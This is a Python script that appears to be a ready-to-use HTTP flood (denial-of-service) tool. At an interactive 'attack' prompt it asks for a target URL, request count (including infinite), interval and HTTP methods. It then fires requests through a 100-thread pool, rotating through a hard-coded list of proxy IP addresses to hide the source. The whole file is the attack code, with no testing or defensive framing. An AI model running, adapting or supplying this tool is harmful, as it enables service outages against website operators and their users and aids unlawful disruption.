
import os
import time
import requests
import logging
import threading
import random
from concurrent.futures import ThreadPoolExecutor

# Constants
lock = threading.Lock()
protection_active = False

def send_request(url, method, retries=3, proxies=None):
    for attempt in range(retries):
        try:
            proxy = None
            if proxies:
                proxy = {"http": proxies, "https": proxies}
            response = requests.request(method, url, timeout=5, proxies=proxy)
            return response.status_code
        except requests.RequestException as e:
            logging.error(f"Request failed: {e}")
            if attempt < retries - 1:
                time.sleep(1)
    return None

def flood(url, count, interval, methods, proxies_list):
    global protection_active
    total_sent = 0

    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = []
        while protection_active and (count == -1 or total_sent < count):
            for method in methods:
                proxy = random.choice(proxies_list) if proxies_list else None
                futures.append(executor.submit(send_request, url, method, proxies=proxy))
                total_sent += 1

            if interval > 0:
                time.sleep(interval)

            # تحديث الرسالة بشكل متكرر كل 4000 طلب
            if total_sent % 4000 == 0:
                print(f"Total requests sent: {total_sent}")

    print(f"Final total requests sent: {total_sent}")

def main():
    global protection_active
    logging.basicConfig(level=logging.INFO)

    # Define your proxies here with correct format
    proxies_list = [
        "http://179.60.183.100:50100",
        "http://179.60.183.98:50100",
        "http://179.60.183.201:50100",
        "http://179.60.183.146:50100",
        "http://193.169.218.254:50100"
        # Add more proxies as needed
    ]

    while True:
        command = input("Enter command (attack/stop/exit): ").strip().lower()

        if command == "attack":
            url = input("Enter the URL to attack: ").strip()
            packet_count = int(input("Enter the number of requests (-1 for infinite): ").strip())
            interval = float(input("Enter the interval between requests (in seconds): ").strip())
            selected_methods = input("Enter HTTP methods (comma-separated, e.g., GET,POST): ").strip().split(',')

            protection_active = True
            methods = [method.strip().upper() for method in selected_methods]
            print(f"Starting flood for {url} with methods: {methods}...")
            flood(url, packet_count, interval, methods, proxies_list)

        elif command == "stop":
            protection_active = False
            print("Stopping flood...")

        elif command == "exit":
            print("Exiting program...")
            break

        else:
            print("Unknown command. Please use 'attack', 'stop', or 'exit'.")

if __name__ == "__main__":
    main()
